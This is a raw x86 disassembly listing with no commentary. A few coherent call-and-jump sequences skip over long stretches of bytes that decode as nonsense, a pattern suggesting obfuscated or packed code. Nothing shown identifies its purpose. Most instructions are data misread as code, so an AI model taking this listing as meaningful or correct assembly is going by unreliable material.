  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x4226e8
  414779:	mov    edi,0x42262e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi+0x1cd9a4c7],edi
  4147a3:	sub    al,0xd1
  4147a5:	stos   DWORD PTR es:[edi],eax
  4147a6:	sahf   
  4147a7:	mov    esi,0xbec4edbe
  4147ac:	mov    esi,0xdb6effe5
  4147b1:	jnp    0x4147f1
  4147b3:	and    DWORD PTR [edx],0x36a4857a
  4147b9:	js     0x4147d6
  4147bb:	test   al,0x72
  4147bd:	adc    al,0xa3
  4147bf:	ret    
  4147c0:	push   ds
  4147c1:	arpl   WORD PTR [ecx],si
  4147c3:	sar    DWORD PTR [ebx+edi*4-0x1c36eeb9],0x36
  4147cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147cc:	(bad)  
  4147cd:	scas   eax,DWORD PTR es:[edi]
  4147ce:	push   ds
  4147cf:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4147d1:	sub    eax,0x23c66586
  4147d6:	fs ret 
  4147d8:	mov    bl,0xae
  4147da:	adc    al,0xb
  4147dc:	mov    cl,0x49
  4147de:	retf   0xcd2a
  4147e1:	repnz mov esi,0x34c4939a
  4147e7:	cmp    BYTE PTR [edi],bh
  4147e9:	xchg   ecx,eax
  4147ea:	mov    ah,0x39
  4147ec:	inc    ecx
  4147ed:	pushf  
  4147ee:	idiv   cl
  4147f0:	xor    ah,BYTE PTR [edi-0x7bacaf98]
  4147f6:	adc    eax,0x473f3fb0
  4147fb:	dec    esi
  4147fc:	dec    edi
  4147fd:	sub    BYTE PTR [edi+0x500bbd52],bl
  414803:	into   
  414804:	push   esi
  414805:	inc    esp
  414806:	loope  0x4147c3
  414808:	lods   al,BYTE PTR ds:[esi]
  414809:	xchg   BYTE PTR [edi+eax*4-0x22],dh
  41480d:	repz mov al,0x2f
  414810:	inc    esi
  414811:	mov    cl,0x1d
  414813:	pop    es
  414814:	xor    cl,bh
  414816:	into   
  414817:	push   0x32
  414819:	mov    ah,0x78
  41481b:	popa   
  41481c:	dec    esp
  41481d:	mov    al,BYTE PTR [esi-0x5f810c7e]
  414823:	adc    BYTE PTR [ecx],dl
  414825:	ret    0xd0ce
  414828:	pop    ebp
  414829:	sldt   WORD PTR [edi-0x65debffa]
  414830:	lods   eax,DWORD PTR ds:[esi]
  414831:	cmp    al,0xe3
  414833:	cmp    dl,cl
  414835:	pop    ss
  414836:	mov    ds:0xc1034f3e,eax
  41483b:	(bad)  
  41483c:	lods   eax,DWORD PTR ds:[esi]
  41483d:	in     al,0x48
  41483f:	mov    al,ds:0x99af7c3b
  414844:	pop    es
  414845:	xor    BYTE PTR [esi],0x63
  414848:	inc    edx
  414849:	ret    
  41484a:	iret   
  41484b:	nop
  41484c:	dec    ebx
  41484d:	rcl    BYTE PTR [ebp-0x1b5ce2cc],1
  414853:	xchg   esp,eax
  414854:	sub    ch,al
  414856:	sbb    BYTE PTR [ecx],al
  414858:	pop    eax
  414859:	stc    
  41485a:	test   DWORD PTR [edx-0x2bf60905],eax
  414860:	cmp    BYTE PTR [edx+0x7ec763c7],0x5
  414867:	neg    BYTE PTR [ebx]
  414869:	cmp    DWORD PTR [edx],edx
  41486b:	mov    DWORD PTR [edx+0x3a],edi
  41486e:	fisubr WORD PTR ss:[edx]
  414871:	test   DWORD PTR [edx-0x4f040525],ebp
  414877:	lea    ebp,[eax+ecx*4-0x26]
  41487b:	mov    ebx,0xc88798c4
  414880:	stos   BYTE PTR es:[edi],al
  414881:	into   
  414882:	mov    ebp,0xbed52475
  414887:	(bad)  
  414888:	xor    al,0x17
  41488a:	and    bh,BYTE PTR [eax]
  41488c:	add    al,0x79
  41488e:	nop
  41488f:	pop    edx
  414890:	bound  ecx,QWORD PTR [esi-0x3b]
  414893:	dec    edx
  414894:	push   ecx
  414895:	xor    bh,BYTE PTR [edi]
  414897:	cwde   
  414898:	repz out 0xf9,eax
  41489b:	inc    ecx
  41489c:	into   
  41489d:	inc    edi
  41489e:	sub    al,0x5
  4148a0:	mov    ebx,DWORD PTR gs:[ebx+0x37980e8e]
  4148a7:	add    DWORD PTR [ecx],0xf872ddfe
  4148ad:	and    eax,0x64aa72b0
  4148b2:	pop    ss
  4148b3:	mov    ds:0xcffc13c3,al
  4148b8:	push   cs
  4148b9:	or     DWORD PTR [esi],edi
  4148bb:	call   0x80d2:0xd194fea2
  4148c2:	cld    
  4148c3:	adc    al,0xf7
  4148c5:	mov    al,0xbc
  4148c7:	jnp    0x414851
  4148c9:	mov    ah,0xd8
  4148cb:	inc    ebx
  4148cc:	dec    esp
  4148cd:	or     BYTE PTR [ebx-0x74b01e61],bh
  4148d3:	jmp    0xb0979fb4
  4148d8:	call   0x3c06:0xbdd7da3e
  4148df:	xchg   esi,eax
  4148e0:	or     eax,0x5f0dd2aa
  4148e5:	pop    ds
  4148e6:	mov    al,ds:0x1bd68405
  4148eb:	pop    esp
  4148ec:	pop    ecx
  4148ed:	or     esp,DWORD PTR [esi+ebp*4]
  4148f0:	inc    esi
  4148f1:	out    0x5e,eax
  4148f3:	test   al,0xd0
  4148f5:	fadd   DWORD PTR [edi+0xdf50c2f]
  4148fb:	inc    ebx
  4148fc:	lods   al,BYTE PTR ds:[esi]
  4148fd:	push   edx
  4148fe:	sub    DWORD PTR [edi+0x4d5aae4],ebx
  414904:	ror    DWORD PTR [edx],1
  414906:	jno    0x4148ae
  414908:	xchg   esi,eax
  414909:	pop    ecx
  41490a:	add    edi,DWORD PTR [esi]
  41490c:	call   0x704ee678
  414911:	sbb    al,0xdb
  414913:	add    al,0x45
  414915:	fsubr  QWORD PTR [esi+0x54]
  414918:	mov    ds:0x5a3f3ae5,eax
  41491d:	test   BYTE PTR [ebp+0x1b],0xa7
  414921:	and    BYTE PTR [edi-0x1c9717a4],cl
  414927:	cmp    DWORD PTR [esi+ebp*8],0xffffff9c
  41492b:	into   
  41492c:	dec    esi
  41492d:	cmc    
  41492e:	push   edx
  41492f:	sbb    BYTE PTR [ebx],0xce
  414932:	stos   BYTE PTR es:[edi],al
  414933:	loop   0x41494d
  414935:	(bad)  
  414936:	xchg   ebp,eax
  414937:	into   
  414938:	test   BYTE PTR [edx+0x1],cl
  41493b:	mov    dl,0xa7
  41493d:	pusha  
  41493e:	push   ds
  41493f:	inc    edi
  414940:	iret   
  414941:	xor    bl,al
  414943:	inc    ecx
  414944:	fnstenv [ebp-0x36]
  414947:	int3   
  414948:	and    al,ch
  41494a:	je     0x414909
  41494c:	lods   al,BYTE PTR ds:[esi]
  41494d:	dec    eax
  41494e:	das    
  41494f:	push   ecx
  414950:	pushf  
  414951:	cmp    ah,BYTE PTR [eax+0x129970bb]
  414957:	cli    
  414958:	mov    ah,0x99
  41495a:	and    ch,cl
  41495c:	btc    eax,ecx
  41495f:	sub    eax,0xb3d6e12b
  414964:	ins    BYTE PTR es:[edi],dx
  414965:	pop    esi
  414966:	(bad)  
  414967:	add    ch,cl
  414969:	cmp    esi,DWORD PTR [ebx+0x50]
  41496c:	fnstenv [edi-0x6a49e53f]
  414972:	add    edx,DWORD PTR [ebp-0x537c9b9a]
  414978:	jge    0x41496e
  41497a:	add    DWORD PTR [esi],esp
  41497c:	or     ah,bh
  41497e:	jno    0x414943
  414980:	jae    0x4149ae
  414982:	shr    DWORD PTR [edi+eax*1-0x28],cl
  414986:	repz in eax,0x23
  414989:	leave  
  41498a:	inc    ebp
  41498b:	cmp    eax,0xd62b62bc
  414990:	pop    eax
  414991:	call   FWORD PTR [esi-0x686aa0cf]
  414997:	ins    DWORD PTR es:[edi],dx
  414998:	dec    edx
  414999:	xchg   ebx,eax
  41499a:	pop    DWORD PTR [eax+edi*8+0x1f]
  41499e:	pop    es
  41499f:	ss inc esp
  4149a1:	mov    eax,0x78323f18
  4149a6:	clc    
  4149a7:	jbe    0x41494a
  4149a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149aa:	or     BYTE PTR [esi+0x67],bl
  4149ad:	adc    al,0x1d
  4149af:	das    
  4149b0:	inc    eax
  4149b1:	add    esp,DWORD PTR [edx-0x3d6a22f2]
  4149b7:	mov    dh,0xb3
  4149b9:	adc    eax,0x79b82ad8
  4149be:	sbb    esp,DWORD PTR [ebp-0x17ed69e1]
  4149c4:	jns    0x414a1a
  4149c6:	(bad)  
  4149c7:	int    0x3c
  4149c9:	adc    eax,0x9e8dd909
  4149ce:	test   al,0x39
  4149d0:	lock aam 0xe5
  4149d3:	push   edx
  4149d4:	in     ax,0xb2
  4149d7:	sub    cl,al
  4149d9:	scas   al,BYTE PTR es:[edi]
  4149da:	xor    bl,BYTE PTR [ebp-0x27175106]
  4149e0:	test   DWORD PTR [eax+0x13],esp
  4149e3:	push   edx
  4149e4:	sbb    esp,edi
  4149e6:	std    
  4149e7:	cmp    DWORD PTR ds:0xc3b47dd9,edi
  4149ed:	inc    ebx
  4149ee:	fist   DWORD PTR [esi]
  4149f0:	scas   al,BYTE PTR es:[edi]
  4149f1:	cmc    
  4149f2:	and    bl,ah
  4149f4:	fidivr DWORD PTR [eax+0x6a]
  4149f7:	sub    al,0xf4
  4149f9:	mov    ah,0x6d
  4149fb:	jnp    0x414a11
  4149fd:	push   edx
  4149fe:	mov    esp,0xde06f57
  414a03:	jl     0x4149f7
  414a05:	aam    0x2e
  414a07:	jnp    0x414a59
  414a09:	jno    0x4149b0
  414a0b:	jbe    0x414991
  414a0d:	ja     0x414a2e
  414a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a10:	ss push ecx
  414a12:	popa   
  414a13:	dec    esi
  414a14:	cmp    ecx,edi
  414a16:	cmp    esp,esp
  414a18:	sub    BYTE PTR [eax+esi*4],dh
  414a1b:	cmp    BYTE PTR [ebp-0x76],ah
  414a1e:	imul   edx,DWORD PTR [ecx+edx*1+0x72],0xffffffe3
  414a23:	test   bh,ah
  414a25:	lds    ebx,FWORD PTR ds:0x9123a553
  414a2b:	int3   
  414a2c:	pusha  
  414a2d:	sub    dh,BYTE PTR ds:0x5758b2e5
  414a33:	inc    ebp
  414a34:	in     al,0x9e
  414a36:	(bad)  
  414a37:	adc    DWORD PTR [ecx-0x1a],eax
  414a3a:	retf   
  414a3b:	shr    BYTE PTR [esi+0x62],0xc2
  414a3f:	pushf  
  414a40:	scas   eax,DWORD PTR es:[edi]
  414a41:	xor    BYTE PTR [ebp-0x50c9759b],bl
  414a47:	adc    al,0x6a
  414a49:	push   cs
  414a4a:	sub    BYTE PTR [ebp+0x7],bl
  414a4d:	loop   0x414a9d
  414a4f:	es push ebp
  414a51:	fwait
  414a52:	mov    eax,0xc3ca223d
  414a57:	mov    ah,0xa9
  414a59:	jbe    0x414ab4
  414a5b:	adc    BYTE PTR [esi+ebx*2],0x87
  414a5f:	imul   esi,DWORD PTR [esi],0xb5742920
  414a65:	icebp  
  414a66:	sub    DWORD PTR ds:0x44d3735a,0xffffffd4
  414a6d:	ret    
  414a6e:	lock jp 0x414a32
  414a71:	mov    ebp,0xedab2511
  414a76:	xchg   edx,eax
  414a77:	fnstcw WORD PTR [ebx]
  414a79:	fwait
  414a7a:	aas    
  414a7b:	inc    eax
  414a7c:	add    ebx,DWORD PTR [edx]
  414a7e:	mov    cl,BYTE PTR [ebp-0x6c]
  414a81:	ins    BYTE PTR es:[edi],dx
  414a82:	mov    cl,0x67
  414a84:	jmp    0x3b5e8638
  414a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a8a:	pop    edx
  414a8b:	xlat   BYTE PTR ds:[ebx]
  414a8c:	leave  
  414a8d:	xor    ecx,DWORD PTR [ebp+ebp*2-0x6f776a1b]
  414a94:	(bad)  [ebx]
  414a96:	dec    esi
  414a97:	daa    
  414a98:	pop    ecx
  414a99:	loope  0x414aa5
  414a9b:	retf   0x450d
  414a9e:	inc    esp
  414a9f:	and    eax,0x575397b0
  414aa4:	cwde   
  414aa5:	ss aam 0x78
  414aa8:	out    0x2,al
  414aaa:	xchg   ecx,eax
  414aab:	aas    
  414aac:	inc    ecx
  414aad:	mov    WORD PTR [esi-0x78097ff4],?
  414ab3:	rcr    BYTE PTR ds:0x839563f0,0x53
  414aba:	cmp    ah,ch
  414abc:	or     bl,dh
  414abe:	jae    0x414b01
  414ac0:	cmp    cl,BYTE PTR [eax+0x449daede]
  414ac6:	mov    ?,WORD PTR ds:0x144d8bec
  414acc:	shrd   eax,ecx,0x2
  414ad0:	shr    ecx,0x2
  414ad3:	mov    ecx,DWORD PTR [ebp+0x10]
  414ad6:	mov    edx,DWORD PTR [ebp+0x14]
  414ad9:	xor    eax,esi
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x4226e8
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x199e14bc],bh
  414b1d:	and    cl,al
  414b1f:	iret   
  414b20:	(bad)  [esi+edi*4-0x413b1242]
  414b27:	mov    esi,0xc3d673e6
  414b2c:	inc    edi
  414b2d:	push   ebp
  414b2e:	inc    edx
  414b2f:	xchg   ecx,eax
  414b30:	mov    WORD PTR [ebx],ds
  414b32:	std    
  414b33:	push   eax
  414b34:	rol    DWORD PTR [ecx-0x69],1
  414b37:	mov    ah,0x38
  414b39:	push   esi
  414b3a:	cmc    
  414b3b:	not    edi
  414b3d:	xchg   BYTE PTR [ebx],bh
  414b3f:	scas   eax,DWORD PTR es:[edi]
  414b40:	retf   0x7de5
  414b43:	xchg   ecx,eax
  414b44:	or     ah,dh
  414b46:	retf   0xe549
  414b49:	and    esi,DWORD PTR [edi+0x1c72b338]
  414b4f:	or     al,0xe3
  414b51:	push   cs
  414b52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b53:	inc    ebx
  414b54:	fnstenv [edx+edx*8]
  414b57:	fidiv  DWORD PTR [ecx-0x42]
  414b5a:	aam    0xdd
  414b5c:	and    al,0x2b
  414b5e:	repz xchg edi,eax
  414b60:	inc    esp
  414b61:	loop   0x414bb8
  414b63:	xor    eax,0x7137dbea
  414b68:	push   eax
  414b69:	xchg   edi,eax
  414b6a:	icebp  
  414b6b:	fisub  DWORD PTR [ebx+0x70]
  414b6e:	mov    bl,0xc1
  414b70:	xor    eax,0xd96dfbd0
  414b75:	pop    ecx
  414b76:	push   0x7f
  414b78:	aad    0xb2
  414b7a:	push   cs
  414b7b:	repz xor al,0x46
  414b7e:	xlat   BYTE PTR ds:[ebx]
  414b7f:	fld    TBYTE PTR [esi]
  414b81:	cmp    DWORD PTR [edx-0x11],ebx
  414b84:	je     0x414b67
  414b86:	pop    ecx
  414b87:	(bad)  
  414b88:	sbb    eax,0xbc39c907
  414b8d:	loopne 0x414b2c
  414b8f:	pop    esp
  414b90:	add    eax,DWORD PTR [edx+0x129d2bb4]
  414b96:	cwde   
  414b97:	xor    al,0x28
  414b99:	inc    edx
  414b9a:	es jp  0x414bba
  414b9d:	(bad)  
  414b9f:	pop    ecx
  414ba0:	push   eax
  414ba1:	sbb    BYTE PTR es:[ebp-0x69],ah
  414ba5:	ds xchg ebp,eax
  414ba7:	lds    edx,FWORD PTR [edx+0x5f]
  414baa:	mov    ch,0x15
  414bac:	add    BYTE PTR [ebx+0x12],ah
  414baf:	dec    edx
  414bb0:	jle    0x414b98
  414bb2:	mov    ?,ecx
  414bb4:	imul   edi,DWORD PTR [ebx],0x39
  414bb7:	inc    esp
  414bb8:	sbb    BYTE PTR [eax-0x3df147e7],bl
  414bbe:	arpl   WORD PTR [edx+0x3a69ef89],sp
  414bc4:	fbstp  TBYTE PTR [edx]
  414bc6:	cli    
  414bc7:	xchg   esi,eax
  414bc8:	xchg   ebp,eax
  414bc9:	(bad)  
  414bca:	(bad)  
  414bcb:	mov    eax,0x11bb6994
  414bd0:	pop    edx
  414bd1:	pushf  
  414bd2:	das    
  414bd3:	scas   al,BYTE PTR es:[edi]
  414bd4:	push   esp
  414bd5:	popf   
  414bd6:	js     0x414bf4
  414bd8:	add    bh,BYTE PTR [ebp-0x20]
  414bdb:	jle    0x414be9
  414bdd:	dec    edi
  414bde:	inc    esi
  414bdf:	push   0xe01f19c1
  414be4:	jno    0x414bd8
  414be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be7:	inc    BYTE PTR [ecx]
  414be9:	sbb    ch,BYTE PTR [eax]
  414beb:	dec    edi
  414bec:	jmp    0x57a3e2aa
  414bf1:	push   ecx
  414bf2:	mov    esi,0xe55952a
  414bf7:	cli    
  414bf8:	cli    
  414bf9:	hlt    
  414bfa:	xor    eax,0x25052278
  414bff:	mov    dl,0xb8
  414c01:	mov    esp,0x15fa069b
  414c06:	jge    0x414c7f
  414c08:	jle    0x414b9f
  414c0a:	es loop 0x414c10
  414c0d:	xchg   edi,eax
  414c0e:	ret    
  414c0f:	mov    ebp,0x4aaf6114
  414c14:	fld    TBYTE PTR [edx+0x226587c9]
  414c1a:	cmp    al,0x77
  414c1c:	sbb    bh,BYTE PTR [eax]
  414c1e:	jae    0x414c93
  414c20:	mov    eax,ds:0x68ca9653
  414c25:	mov    gs,WORD PTR [esi+eiz*8-0x7a]
  414c29:	call   0x67c8:0xc3c62b25
  414c30:	jo     0x414c3b
  414c32:	fld    TBYTE PTR [edi+0x6cc1af0a]
  414c38:	iret   
  414c39:	mov    ebx,DWORD PTR [ebx]
  414c3b:	jmp    0xd599:0x3e5fc46b
  414c42:	stos   BYTE PTR es:[edi],al
  414c43:	push   es
  414c44:	or     ah,ah
  414c46:	jmp    0x4396c88c
  414c4b:	std    
  414c4c:	mov    dl,0xdf
  414c4e:	ficomp WORD PTR ds:0xa58c72cc
  414c54:	fwait
  414c55:	test   BYTE PTR [esi*8+0x6748616d],bl
  414c5c:	jae    0x414c2f
  414c5e:	add    ah,BYTE PTR [ebp+0x54]
  414c61:	lahf   
  414c62:	sbb    BYTE PTR [eax],cl
  414c64:	and    al,0x46
  414c66:	sbb    BYTE PTR [ebx-0x77],al
  414c69:	jmp    0x414cb5
  414c6b:	pop    ss
  414c6c:	rcl    BYTE PTR [ebp+0x68276f21],cl
  414c72:	dec    eax
  414c73:	icebp  
  414c74:	jbe    0x414c3e
  414c76:	add    esi,esi
  414c78:	lock xchg ebx,eax
  414c7a:	das    
  414c7b:	add    BYTE PTR [ebp-0x4f],bh
  414c7e:	xchg   esp,eax
  414c7f:	dec    edi
  414c80:	jns    0x414cd3
  414c82:	out    0xa,eax
  414c84:	iret   
  414c85:	popf   
  414c86:	xchg   esi,eax
  414c87:	fsubr  DWORD PTR ds:0xc8fe77c3
  414c8d:	add    bh,BYTE PTR ss:0x2a836bd9
  414c94:	fnsave [eax+0x99a66bf]
  414c9a:	add    DWORD PTR [esi],0x94935c3
  414ca0:	lods   al,BYTE PTR ds:[esi]
  414ca1:	push   esp
  414ca2:	mov    ebx,0x30684804
  414ca7:	jae    0x414d1a
  414ca9:	xor    cl,0x62
  414cac:	mov    dl,0xe4
  414cae:	fwait
  414caf:	mov    ds:0xe55d4a5,al
  414cb4:	jne    0x414c9e
  414cb6:	push   DWORD PTR [edi]
  414cb8:	mov    edi,0x31db28a
  414cbd:	lods   al,BYTE PTR ds:[esi]
  414cbe:	loop   0x414c7c
  414cc0:	or     bh,BYTE PTR [eax]
  414cc2:	les    esi,FWORD PTR [eax+ebx*1-0x64af2c58]
  414cc9:	mov    WORD PTR [eax+0x16a4ee25],gs
  414ccf:	mov    dh,0x39
  414cd2:	xchg   ebp,eax
  414cd3:	mov    ebx,0x9b81cc86
  414cd8:	arpl   WORD PTR [edx-0x54242e14],sp
  414cde:	sbb    edx,DWORD PTR [eax-0x1f4b8e9f]
  414ce4:	or     BYTE PTR fs:[eax+edi*8+0x48],ah
  414ce9:	cdq    
  414cea:	in     eax,0xe8
  414cec:	adc    ah,ch
  414cee:	inc    ecx
  414cef:	push   ecx
  414cf0:	mov    eax,ds:0xe38ad1f0
  414cf5:	std    
  414cf6:	ins    BYTE PTR es:[edi],dx
  414cf7:	dec    ebp
  414cf8:	ja     0x414ced
  414cfa:	out    dx,al
  414cfb:	rol    BYTE PTR [esi-0x50aca4dc],0x46
  414d02:	or     DWORD PTR [ebp+0x645fceaf],esp
  414d08:	(bad)  
  414d09:	iret   
  414d0a:	and    al,0x3
  414d0c:	mov    ecx,DWORD PTR [esi]
  414d0e:	cmc    
  414d0f:	push   DWORD PTR [esi-0x1475d68]
  414d15:	imul   esi,DWORD PTR [edi+0x7c],0x6
  414d19:	mov    esp,0x41d22de3
  414d1e:	aam    0xe5
  414d20:	add    BYTE PTR [ecx-0x3c],cl
  414d23:	mov    cl,0x93
  414d25:	sub    eax,0x282b36b
  414d2a:	cmp    DWORD PTR [esi-0x515140ad],0xffffff88
  414d31:	test   BYTE PTR [edi],bl
  414d33:	test   eax,0x31a2c1a2
  414d38:	or     dh,bh
  414d3a:	inc    eax
  414d3b:	jbe    0x414cf1
  414d3d:	fwait
  414d3e:	mov    ds:0xfa50dda7,eax
  414d43:	mov    DWORD PTR [ecx+0x6d08be36],edx
  414d49:	sub    bh,BYTE PTR [edx+0x10]
  414d4c:	fnstcw WORD PTR [eax+eiz*2-0x472e635]
  414d53:	adc    dh,BYTE PTR [esi-0x3e]
  414d56:	cmp    al,0xeb
  414d58:	sub    eax,DWORD PTR [ebp+0x69]
  414d5b:	setnp  BYTE PTR [esi]
  414d5e:	and    cl,0xb0
  414d61:	mov    al,ds:0x46ae0e62
  414d66:	ins    DWORD PTR es:[edi],dx
  414d67:	fdiv   DWORD PTR [edi-0x40]
  414d6a:	imul   esp,DWORD PTR [eax-0x610fe57d],0xffffff94
  414d71:	xor    edi,ebx
  414d73:	add    eax,0xcff1829c
  414d78:	cmp    eax,0xeb07a54c
  414d7d:	xchg   BYTE PTR [eax],ah
  414d7f:	push   cs
  414d80:	add    eax,0x19327186
  414d85:	push   cs
  414d86:	lock pop ds
  414d88:	test   eax,ecx
  414d8a:	xchg   ebx,eax
  414d8b:	dec    esp
  414d8c:	pusha  
  414d8d:	dec    ebx
  414d8e:	jmp    0x9008:0x20bd5442
  414d95:	out    0x8b,al
  414d97:	jnp    0x414d5d
  414d99:	add    BYTE PTR [esi+0x7],bh
  414d9c:	out    dx,eax
  414d9d:	push   ebx
  414d9e:	aas    
  414d9f:	shr    DWORD PTR [ecx-0x8],0x69
  414da3:	push   es
  414da4:	rol    DWORD PTR [eax+0x4f68c71d],1
  414daa:	sub    cl,BYTE PTR [edi+0x34]
  414dad:	shl    DWORD PTR [ecx+0x56],1
  414db0:	imul   eax,esi,0x5c
  414db3:	stc    
  414db4:	push   ecx
  414db5:	push   esp
  414db6:	push   ebx
  414db7:	repnz dec eax
  414db9:	push   ecx
  414dba:	mov    ebx,0xbfbfa264
  414dbf:	enter  0x76b9,0x31
  414dc3:	sbb    ah,0x6f
  414dc6:	xor    al,dl
  414dc8:	loope  0x414da6
  414dca:	adc    BYTE PTR [esi-0xd1fcc04],cl
  414dd0:	retf   0x3167
  414dd3:	(bad)  
  414dd4:	enter  0x1042,0xad
  414dd8:	sbb    ecx,DWORD PTR [ecx+0x176e3afc]
  414dde:	ins    BYTE PTR es:[edi],dx
  414ddf:	gs or  al,0x5f
  414de2:	aad    0xe
  414de4:	xchg   esi,eax
  414de5:	jno    0x414dc7
  414de7:	xchg   esi,eax
  414de8:	and    al,0xeb
  414dea:	sbb    eax,0xfa9f78eb
  414def:	hlt    
  414df0:	xor    edi,DWORD PTR [eax]
  414df2:	cmp    BYTE PTR [edx+0x36],dh
  414df5:	cmp    DWORD PTR [ebp+0x6d],0x51
  414df9:	idiv   BYTE PTR ss:[ebx+esi*2-0x45]
  414dfe:	dec    edi
  414dff:	mov    esi,0x6c317713
  414e04:	aas    
  414e05:	inc    ecx
  414e06:	or     ecx,DWORD PTR [eax]
  414e08:	mov    esi,0x91b1f13d
  414e0d:	adc    DWORD PTR [ecx],esi
  414e0f:	xchg   edi,eax
  414e10:	sbb    BYTE PTR [ebp-0x75cb7391],ch
  414e16:	inc    esi
  414e17:	mov    bl,0xeb
  414e19:	sub    eax,0x91ff1cfc
  414e1e:	test   BYTE PTR [edx+0x3],0x34
  414e22:	inc    esi
  414e23:	lds    esp,FWORD PTR [ecx]
  414e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e26:	inc    eax
  414e27:	call   0x87c0ce25
  414e2c:	sti    
  414e2d:	imul   ecx,DWORD PTR [ebx+0x5b],0xffffffbc
  414e31:	inc    eax
  414e32:	sbb    ah,BYTE PTR [ecx-0x5e4c3f32]
  414e38:	xor    eax,0x61fa4b85
  414e3d:	sub    edi,DWORD PTR [edx-0x2f]
  414e40:	mov    al,0x76
  414e42:	sar    BYTE PTR [ebp+0x3b],1
  414e45:	enter  0x34e9,0x3
  414e49:	add    BYTE PTR [eax],al
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0x5a9e22a6
  414e58:	das    
  414e59:	jl     0x414ded
  414e5b:	or     al,0xaa
  414e5d:	mov    esi,0xbec4edbe
  414e62:	mov    esi,0xdab1ade7
  414e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e68:	out    0x3f,eax
  414e6a:	adc    BYTE PTR [edi-0x782085ae],dl
  414e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e71:	int    0x6d
  414e73:	mov    al,ds:0x7034e94
  414e78:	fcom   DWORD PTR [edi+edx*1+0x5ec623eb]
  414e7f:	ret    0xd7a3
  414e82:	jl     0x414ea3
  414e84:	lock and bl,BYTE PTR [ebp-0x2d]
  414e88:	call   DWORD PTR [ebp+0x76b2172e]
  414e8e:	inc    ebp
  414e8f:	sbb    DWORD PTR [ebx-0x7dccc712],esp
  414e95:	sub    BYTE PTR [eax],0x61
  414e98:	sub    al,0xa0
  414e9a:	fdiv   st,st(7)
  414e9c:	out    dx,eax
  414e9d:	pop    edi
  414e9e:	loope  0x414e66
  414ea0:	stos   DWORD PTR es:[edi],eax
  414ea1:	(bad)  
  414ea3:	cld    
  414ea4:	mov    ebp,0xa6c92994
  414ea9:	jae    0x414eb9
  414eab:	jne    0x414ea1
  414ead:	xor    eax,esi
  414eaf:	jnp    0x414e5f
  414eb1:	mov    bl,0x3f
  414eb3:	inc    ebp
  414eb4:	cmp    eax,0x919a9f27
  414eb9:	cmp    BYTE PTR [eax],0x9b
  414ebc:	repz cmp eax,0x24d5d43a
  414ec2:	inc    esi
  414ec3:	mov    BYTE PTR [edx+ecx*1-0x80a040c],bh
  414eca:	mov    eax,es:0xa5c0ea54
  414ed0:	mov    ch,0xbb
  414ed2:	xchg   edi,eax
  414ed3:	test   BYTE PTR ds:0xd4416aa3,bh
  414ed9:	sti    
  414eda:	sub    DWORD PTR [ebp+0x22b23247],esp
  414ee0:	sbb    BYTE PTR [edi+ebp*4-0x30f8e2b2],dl
  414ee7:	mov    ds:0x872b20bf,al
  414eec:	sub    DWORD PTR [ebx+0x464f274d],ebx
  414ef2:	(bad)  [ecx]
  414ef4:	sar    BYTE PTR [ebp+0x4af16dd5],cl
  414efa:	mov    eax,0x392fa68b
  414eff:	jl     0x414ede
  414f01:	loopne 0x414e9d
  414f03:	inc    esi
  414f04:	adc    DWORD PTR [edi+0x5d],edi
  414f07:	sub    BYTE PTR [edx-0x3f],0xee
  414f0b:	jne    0x414ef8
  414f0d:	cwde   
  414f0e:	ins    BYTE PTR es:[edi],dx
  414f0f:	dec    ebp
  414f10:	push   edi
  414f11:	mov    edx,DWORD PTR [edi]
  414f13:	in     eax,dx
  414f14:	std    
  414f15:	push   edi
  414f16:	jns    0x414f85
  414f18:	push   cs
  414f19:	xor    eax,0xb4b5af8d
  414f1e:	mov    esp,0x18877209
  414f23:	das    
  414f24:	dec    eax
  414f25:	addr16 push ss
  414f27:	pushf  
  414f28:	or     DWORD PTR [edx-0x6364d452],ebp
  414f2e:	and    esi,eax
  414f30:	jmp    0x414f37
  414f32:	int    0xd2
  414f34:	test   WORD PTR [edx],bx
  414f37:	ds sar dl,1
  414f3a:	xor    cl,BYTE PTR [edi+0x3f84483d]
  414f40:	cmp    DWORD PTR [ecx-0x11e44667],ebx
  414f46:	add    DWORD PTR [esi-0x3f0931c6],ebx
  414f4c:	test   eax,0x9179bd77
  414f51:	push   edx
  414f52:	cwde   
  414f53:	cld    
  414f54:	fstp   DWORD PTR [edx+0x34b32611]
  414f5a:	icebp  
  414f5b:	aad    0xb5
  414f5d:	bound  ebp,QWORD PTR [ecx-0x56710372]
  414f63:	cld    
  414f64:	out    dx,eax
  414f65:	mov    ds:0xbfd3d248,eax
